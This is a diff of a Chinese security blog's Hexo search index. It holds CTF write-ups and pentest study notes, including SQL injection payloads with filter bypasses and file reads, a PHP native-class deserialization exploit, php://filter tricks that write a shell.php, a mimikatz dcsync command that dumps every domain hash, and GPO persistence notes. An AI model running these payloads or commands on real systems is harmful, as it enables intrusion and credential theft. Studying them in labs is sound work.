       <tags>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Go</title>
+    <url>/2022/03/21/Go/</url>
+    <content><![CDATA[<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p>
+<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p>
+<p>感觉go结构和java  很像，但go有指针。</p>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件exe</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure>
+
+<p>结构</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包声明   package</span><br><span class="line">引入包   import (&quot;&quot; &quot;&quot; &quot;&quot; &quot;xx&#x2F;xxx&quot;)</span><br><span class="line">函数     func function_name( [parameter list] ) [return_types] &#123;  函数体 &#125;</span><br><span class="line">变量     var xxx&#x3D;&quot;str&quot;  </span><br><span class="line">常量     const</span><br><span class="line">语句 &amp; 表达式  </span><br><span class="line">注释      </span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  使用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">	test()</span><br><span class="line">	<span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">	age = <span class="number">11</span></span><br><span class="line">	fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>学习：<a href="https://www.runoob.com/go">https://www.runoob.com/go</a></p>
+<p><a href="https://github.com/Leslie1sMe/golang">Leslie1sMe/golang: Golang的实战项目，学习笔记，代码例程汇总。 (github.com)</a></p>
+]]></content>
+      <categories>
+        <category>Go</category>
+      </categories>
+      <tags>
+        <tag>Go学习</tag>
       </tags>
   </entry>
   <entry>
@@ -351,67 +440,6 @@
       </categories>
       <tags>
         <tag>Oracel注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MARDASCTF2021</title>
-    <url>/2021/05/02/MARDASCTF2021/</url>
-    <content><![CDATA[<h2 id="BestDB-sql注入类型"><a href="#BestDB-sql注入类型" class="headerlink" title="BestDB -sql注入类型"></a>BestDB -sql注入类型</h2><p><img src="/2021/05/02/MARDASCTF2021/1.png" alt="1"></p>
-<p>一看就感觉存在sql注入，重点是如何闭合，绕过。</p>
-<span id="more"></span>
-
-<p>F12 发现      <code>$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot;&quot;;</code></p>
-<p>刚开始没有注意到 <code>OR username = \&quot;$query\&quot;&quot;;</code> giao ,一直在通过进行注入，但是都  Forbidden!!!了，过滤了单引号</p>
-<p>然后尝试输入username尝试，当$query值为lisi时候我们进行闭合会有回显，而且只有个简单的空格过滤，/**/绕过即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1# 回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2# 报错</span><br><span class="line">说明存在注入。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3#  回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4#  不回显。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据库名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata)2,3# </span><br><span class="line">可有可无这</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/02/MARDASCTF2021/2.png" alt="2"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查表名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),2,3#   </span><br><span class="line"></span><br><span class="line">过滤了单引号&#39;dataabse()&#39;就不能使用,</span><br><span class="line">正常在数据库查询，表名需带反引号，在php端中并不需要</span><br><span class="line"></span><br><span class="line">f1agdas,users两个表</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查字段名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),2,3# </span><br><span class="line"></span><br><span class="line">&quot;f1agdas&quot;记得双引号</span><br><span class="line"></span><br><span class="line">id,f1agdas</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据</span><br><span class="line"></span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;f1agdas&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),2,3#</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c61672e747874)),2,3#</span><br><span class="line"></span><br><span class="line">&#x2F;flag.txt进行十六进制或者CHAR()是为了绕过对&quot;&#x2F;&quot;过滤</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/02/MARDASCTF2021/3.png" alt="3"></p>
-<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>先贴上源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.anquanke.com/post/id/167140#h2-5">https://www.anquanke.com/post/id/167140#h2-5</a></p>
-<p>以前没有见过，这里存在动态拼接类，我们需要原生类进行去读文件。</p>
-<p>一.可遍历目录类</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DirectoryIteratorFilesystemIterator</span><br></pre></td></tr></table></figure>
-
-<p><code>GlobIterator</code> 与上面略不同，该类可以通过模式匹配来寻找文件路径。</p>
-<p>二.可读取文件类</p>
-<p><code>SplFileObject</code> 在此函数中，URL 可作为文件名，不过也要受到<code>allow_url_fopen</code>影响</p>
-<p>参考<a href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class &#x3D; &#39;FilesystemIterator&#39;;    public $para &#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;    public $check ;&#125;$pop&#x3D;new A();$pop&#x3D;serialize($pop);var_dump($pop);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/02/MARDASCTF2021/4.png" alt="4"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class&#x3D;&#39;SplFileObject&#39;;    public $para&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x2F;flag.php&quot;;    public $check;    &#125;$o  &#x3D; new A();echo serialize($o);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/02/MARDASCTF2021/5.png" alt="5"></p>
-<hr>
-<p>利用原生类来反序列化，题目我第一次见，参考了网上的博客，</p>
-<p>因为php原生类有很多的特定功能。</p>
-<hr>
-<p><a href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9/">https://shimo.im/docs/V1hLlJ0RoRkI7Si9/</a>  各位大佬wp</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>MARDASCTF2021</tag>
       </tags>
   </entry>
   <entry>
@@ -564,33 +592,105 @@
       </tags>
   </entry>
   <entry>
-    <title>mrctf2021</title>
-    <url>/2021/04/18/mrctf2021/</url>
-    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
-<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
-<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
+    <title>file_put_content利用(php://filter协议)</title>
+    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<hr>
+<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
 <span id="more"></span>
 
-<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
-<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
-<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
-<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
-<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Payload:     </p>
+<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
+<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
+</blockquote>
+<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
 
-<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
-<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
-<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
-<p>太菜了呜呜呜。</p>
-<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
+
+
+<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
+<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
+<blockquote>
+<p>Payload: </p>
+<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
+</blockquote>
 <hr>
-<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
+<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>MRCTF2021</tag>
+        <tag>file_put_content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AD域的攻击方式</title>
+    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
+<p>win+R键打开运行，输入“gpedit.msc”</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
+<p>添加对应脚本即可</p>
+<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
+<p>通常用来权限维持</p>
+<span id="more"></span>
+
+<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
+<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
+<p>目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
+<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
+<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
+<p>Gpp 用来在下面场景存储和使用凭据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得以下任一用户的权限：</span><br><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>AD域的攻击方式</tag>
       </tags>
   </entry>
   <entry>
@@ -670,6 +770,49 @@
       </categories>
       <tags>
         <tag>log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>middleware</title>
+    <url>/2022/03/20/middleware-java/</url>
+    <content><![CDATA[<h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><span id="more"></span>
+
+<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><h3 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h3><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1>]]></content>
+      <categories>
+        <category>中间件</category>
+      </categories>
+      <tags>
+        <tag>中间件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2021</title>
+    <url>/2021/04/18/mrctf2021/</url>
+    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
+<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
+<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
+<span id="more"></span>
+
+<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
+<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
+<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
+<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
+<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>
+
+<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
+<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
+<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
+<p>太菜了呜呜呜。</p>
+<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
+<hr>
+<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>MRCTF2021</tag>
       </tags>
   </entry>
   <entry>
@@ -886,6 +1029,14 @@
 <li><p><code>-v </code>              显示详细的输出等级（-v 3 会显示Payload）</p>
 </li>
 </ul>
+<p>代理：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy http:&#x2F;&#x2F;192.168.1.1:xxxx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy-file：加载代理ip列表</span><br><span class="line"></span><br><span class="line">–proxy-file&#x3D;xxx.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>--fresh-queries</code>             不会从缓存里面加载</p>
 ]]></content>
       <categories>
         <category>渗透工具学习</category>
@@ -1023,121 +1174,170 @@
       </tags>
   </entry>
   <entry>
-    <title>内网横向渗透</title>
-    <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>不断更新</p>
-<p>配合impacket工具使用</p>
-<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
-<p>利用条件：</p>
+    <title>信息收集</title>
+    <url>/2022/03/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p>在线工具：<a href="https://hackertarget.com/">https://hackertarget.com/</a></p>
+<h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>查询域名是否已经被注册，以及注册域名和注册人的详细信息</p>
+<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul>
+<li>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
+<li>国外：       <a href="https://www.whois.com/">https://www.whois.com/</a></li>
+<li>腾讯云：  <a href="https://whois.cloud.tencent.com/domain?domain=">https://whois.cloud.tencent.com/domain?domain=</a></li>
+</ul>
+<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><ul>
+<li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">美国企业备案查询</a></li>
+<li><a href="http://www.beianbeian.com/">ICP备案查询网</a></li>
+<li><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">工业和信息化部ICP/IP/域名信息备案管理</a></li>
+</ul>
+<h3 id="google-hack语法"><a href="#google-hack语法" class="headerlink" title="google hack语法"></a>google hack语法</h3><p>site:xxx.com intext:管理</p>
+<p>site:xxx.com inurl:login/admin</p>
+<p>site:xxx.com intitle:后台</p>
+<p>site:xxx.com filetype:文件的格式 </p>
+<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>shodan:     <a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
+<p>zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
+<p>fafa:            <a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p>
+<p>hunter:       <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
 <ol>
-<li>开放139,445端口</li>
-<li></li>
